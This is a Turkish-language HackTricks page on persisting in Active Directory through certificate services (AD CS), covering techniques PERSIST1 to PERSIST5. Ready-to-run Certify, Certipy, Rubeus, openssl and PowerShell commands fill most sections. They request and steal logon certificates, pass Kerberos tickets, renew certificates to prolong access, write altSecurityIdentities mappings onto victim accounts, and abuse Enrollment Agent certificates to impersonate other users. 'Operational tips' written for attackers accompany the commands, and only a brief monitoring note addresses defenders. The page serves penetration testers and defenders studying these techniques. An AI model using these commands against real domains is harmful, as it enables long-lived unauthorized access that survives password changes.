# AD CS Hesap Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresindeki kapsamlı araştırmanın hesap persistence bölümlerinin kısa bir özetidir.**<sup>[[7]](#references)</sup>

## Sertifikalarla Active User Credential Theft'i Anlamak – PERSIST1

Domain authentication sağlayan bir sertifikanın bir kullanıcı tarafından talep edilebildiği bir senaryoda saldırgan, ağ üzerinde persistence sağlamak amacıyla bu sertifikayı talep edip çalma fırsatına sahip olur. Varsayılan olarak Active Directory'deki `User` template'i bu tür taleplere izin verir; ancak bazen devre dışı bırakılmış olabilir.<sup>[[3]](#references)[[7]](#references)</sup>

[Certify](https://github.com/GhostPack/Certify) veya [Certipy](https://github.com/ly4k/Certipy) kullanarak client authentication'a izin veren etkin template'leri arayabilir ve ardından bir tane talep edebilirsiniz:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Bir sertifikanın gücü, sertifika geçerli kaldığı sürece parola değişikliklerinden bağımsız olarak, ait olduğu kullanıcı kimliğini doğrulayabilmesinden gelir.

PEM'i PFX'e dönüştürüp bir TGT elde etmek için kullanabilirsiniz:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Not: Diğer tekniklerle (THEFT bölümlerine bakın) birleştirildiğinde, sertifika tabanlı kimlik doğrulama LSASS'e dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.

## Sertifikalarla Makine Kalıcılığı Sağlama - PERSIST2

Bir saldırgan bir host üzerinde yükseltilmiş ayrıcalıklara sahipse, varsayılan `Machine` template'ini kullanarak ele geçirilmiş sistemin makine hesabını bir sertifika için enroll edebilir. Makine olarak kimlik doğrulaması yapmak, yerel servisler için S4U2Self kullanılmasını sağlar ve kalıcı host persistence sunabilir:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Sertifika Yenileme Yoluyla Persistence'ı Genişletme - PERSIST3

Sertifika şablonlarının geçerlilik ve yenileme sürelerini kötüye kullanmak, bir saldırganın uzun süreli erişimi sürdürmesine olanak tanır. Daha önce verilmiş bir sertifikaya ve onun private key'ine sahipseniz, sona ermeden önce sertifikayı yenileyerek orijinal principal ile ilişkilendirilen ek request artifact'ları bırakmadan yeni ve uzun süre geçerli bir credential elde edebilirsiniz.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasyonel ipucu: Saldırganın kontrolündeki PFX dosyalarının kullanım ömürlerini takip edin ve erken yenileyin. Yenileme işlemi, güncellenmiş sertifikaların modern SID mapping extension'ını içermesini de sağlayabilir; böylece daha katı DC mapping kuralları altında kullanılabilir kalırlar (sonraki bölüme bakın).

## Explicit Certificate Mappings (altSecurityIdentities) Yerleştirme – PERSIST4

Bir hedef hesabın `altSecurityIdentities` attribute'una yazabiliyorsanız, saldırganın kontrolündeki bir sertifikayı bu hesaba explicit olarak map edebilirsiniz. Bu yöntem password değişiklikleri boyunca kalıcılığını korur ve strong mapping formatları kullanıldığında modern DC enforcement altında da çalışmaya devam eder.<sup>[[2]](#references)</sup>

Yüksek seviyeli akış:

1. Kontrolünüzde olan bir client-auth sertifikası edinin veya issue edin (ör. `User` template'ını kendi hesabınız olarak enroll edin).
2. Sertifikadan strong bir identifier çıkarın (Issuer+Serial, SKI veya SHA1-PublicKey).
3. Bu identifier'ı kullanarak victim principal'ın `altSecurityIdentities` attribute'u üzerinde explicit bir mapping ekleyin.
4. Sertifikanızla authenticate olun; DC, explicit mapping üzerinden sertifikayı victim'a map eder.

Strong Issuer+Serial mapping kullanan bir örnek (PowerShell):
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ardından PFX'inizle kimlik doğrulaması yapın. Certipy doğrudan bir TGT alacaktır:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Güçlü `altSecurityIdentities` Eşlemeleri Oluşturma

Pratikte **Issuer+Serial** ve **SKI** eşlemeleri, saldırganın elindeki bir sertifikadan oluşturulabilecek en kolay güçlü biçimlerdir. Bu durum, DC'lerin varsayılan olarak **Full Enforcement** moduna geçtiği ve zayıf eşlemelerin güvenilirliğini yitirdiği **11 Şubat 2025** sonrasında önemlidir.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notlar
- Yalnızca güçlü mapping türlerini kullanın: `X509IssuerSerialNumber`, `X509SKI` veya `X509SHA1PublicKey`. Zayıf formatlar (Subject/Issuer, yalnızca Subject, RFC822 e-postası) kullanımdan kaldırılmıştır ve DC policy tarafından engellenebilir.
- Mapping hem **user** hem de **computer** nesnelerinde çalışır; bu nedenle bir computer hesabının `altSecurityIdentities` özelliğine yazma erişimi, o makine olarak kalıcılık sağlamak için yeterlidir.
- Sertifika zinciri, DC tarafından güvenilen bir root'a kadar oluşturulabilmelidir. NTAuth içindeki Enterprise CA'ler genellikle güvenilirdir; bazı ortamlarda public CA'lere de güvenilir.
- Schannel authentication, DC'de Smart Card Logon EKU eksik olduğunda veya `KDC_ERR_PADATA_TYPE_NOSUPP` döndürdüğünde PKINIT başarısız olsa bile persistence için kullanılmaya devam eder.

#### 2025+ `Issuer/SID` explicit mappings

**9 Eylül 2025** security update ile patch'lenmiş **Windows Server 2022+** domain controller'larda Microsoft, aynı CA'den yeniden sertifika issuance yapılmasından sonra da geçerli kaldığı için persistence açısından cazip olan başka bir güçlü explicit mapping formatı ekledi:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operasyonel olarak bu, eski strong formatlardan farklıdır:
- `Issuer+Serial`, **tek bir exact certificate** pinler.
- `SKI` / `SHA1-PUKEY`, **tek bir keypair** pinler.
- `Issuer/SID`, **issuing CA + target SID** pinler; böylece aynı CA tarafından yenilenen veya yeniden issue edilen sertifikalar, `altSecurityIdentities` yeniden yazılmadan çalışmaya devam eder.

Gereksinimler ve dikkat edilmesi gerekenler
- Logon için sunulan sertifika, SID security extension içinde gerçekten target account SID değerini içermelidir.
- Bu format, SID extension değerini çıkartan `ESC9` / `ESC16` tarzı sertifikalar için kullanışlı değildir; bu durumlarda `Issuer+Serial`, `SKI` veya `SHA1-PUKEY` kullanın.

Weak explicit mappings ve attack paths hakkında daha fazla bilgi için bkz.:


{{#ref}}
domain-escalation.md
{{#endref}}

## Persistence olarak Enrollment Agent – PERSIST5

Geçerli bir Certificate Request Agent/Enrollment Agent sertifikası elde ederseniz, kullanıcılar adına istediğiniz zaman yeni logon-capable sertifikalar mint edebilir ve agent PFX dosyasını bir persistence token olarak offline saklayabilirsiniz. Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Bu persistence'ı ortadan kaldırmak için agent sertifikasının veya template izinlerinin iptal edilmesi gerekir.

Operasyonel notlar
- Modern `Certipy` sürümleri hem `-on-behalf-of` hem de `-renew` seçeneklerini destekler; bu nedenle Enrollment Agent PFX'ini elinde bulunduran bir saldırgan, ilk hedef hesaba yeniden erişmeden leaf sertifikaları oluşturabilir ve daha sonra yenileyebilir.<sup>[[4]](#references)</sup>
- PKINIT tabanlı TGT alımı mümkün değilse bile, ortaya çıkan on-behalf-of sertifikası Schannel kimlik doğrulaması için `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` ile kullanılabilir.<sup>[[5]](#references)</sup>

## PKINIT Başarısız Olduğunda Persisted Sertifikaları Kullanma

DC'de Smart Card Logon destekleyen bir sertifika yoksa PKINIT üzerinden sertifika ile logon işlemi `KDC_ERR_PADATA_TYPE_NOSUPP` hatasıyla başarısız olabilir. Bu durum persistence primitive'ini ortadan kaldırmaz: aynı PFX çoğu zaman Schannel kimlik doğrulamalı LDAP erişimi için hâlâ kullanılabilir.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Bu, özellikle PERSIST4/PERSIST5 sonrasında oldukça kullanışlıdır; çünkü Linux/macOS üzerinden çalışmaya devam edebilir ve [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) bırakmak veya yazılabilir delegation özniteliklerini düzenlemek gibi diğer directory persistence eylemlerini zincirleyebilirsiniz.

## 2025 Strong Certificate Mapping Enforcement: Persistence Üzerindeki Etkisi

Microsoft KB5014754, domain controller'lar üzerinde Strong Certificate Mapping Enforcement özelliğini kullanıma sundu. **11 Şubat 2025** tarihinden beri DC'ler, weak/ambiguous mapping'ler için varsayılan olarak **Full Enforcement** modundadır ve **9 Eylül 2025** güvenlik güncellemesinden itibaren patch'lenmiş DC'ler eski Compatibility-mode fallback mekanizmasını artık desteklememektedir.<sup>[[1]](#references)</sup> Pratik etkileri:

- SID mapping extension içermeyen 2022 öncesi certificates, DC'ler Full Enforcement modundayken implicit mapping işleminde başarısız olabilir. Saldırganlar, certificates'ı AD CS üzerinden yenileyerek (SID extension elde etmek için) veya `altSecurityIdentities` içine strong explicit mapping yerleştirerek (PERSIST4) erişimi sürdürebilir.
- Strong format'ları (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` ve modern DC'lerde `Issuer/SID`) kullanan explicit mapping'ler çalışmaya devam eder. Weak format'lar (Issuer/Subject, Subject-only, RFC822) engellenebilir ve persistence amacıyla kullanılmamalıdır.
- Weak mapping'ler hâlâ çalışıyor gibi görünüyorsa, bunu güvenilir ve uzun vadeli bir persistence yolu olarak değerlendirmek yerine, patch'lenmemiş veya farklı yapılandırılmış bir DC ile karşılaştığınızı varsayın.
- SID extension'ı bastıran `ESC9` / `ESC16` tarzı issuance yolları `Issuer/SID` kullanımını olanaksız hâle getirir; bu nedenle fallback strong mapping'ler veya normal bir template üzerinden renewal işlemi pratik persistence seçeneği olur.

Administrators şunları izlemeli ve bunlar için alert oluşturmalıdır:
- `altSecurityIdentities` değişiklikleri ile Enrollment Agent ve User certificates issuance/renewal işlemleri.
- On-behalf-of requests ve olağandışı renewal pattern'leri için CA issuance log'ları.

## References

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
